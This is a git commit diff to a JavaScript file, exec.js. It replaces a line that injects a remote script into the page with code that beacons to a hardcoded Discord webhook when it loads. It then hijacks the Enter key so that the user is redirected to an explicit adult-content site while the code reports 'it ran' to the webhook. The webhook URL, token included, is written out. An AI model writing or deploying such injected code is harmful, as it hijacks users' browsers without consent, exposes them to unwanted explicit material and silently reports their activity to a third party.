477ff42ae7d733f9650f256f89878e2192378508
Ongenix <96583029+Ongenix@users.noreply.github.com>
2024-06-14 11:33:15 -0600

    Update exec.js

--- exec.js
+++ exec.js
@@ -1,1 +1,8 @@
-document.body.innerHTML = '<script src="https://raw.githubusercontent.com/Ongenix/5-letter-strings/main/test.js"></script>' + document.body.innerHTML;
+var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": 'it started'});xhr.send(data);
+(function() { 
+    document.addEventListener('keydown', function(event) {
+        if (event.key === 'Enter') {
+            window.location.href = 'https://e621.net/posts/4786657';
+            var xhr = new XMLHttpRequest();var url = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";xhr.open("POST", url, true);xhr.setRequestHeader("Content-Type", "application/json");var data = JSON.stringify({"content": 'it ran'});xhr.send(data);
+        }
+    });
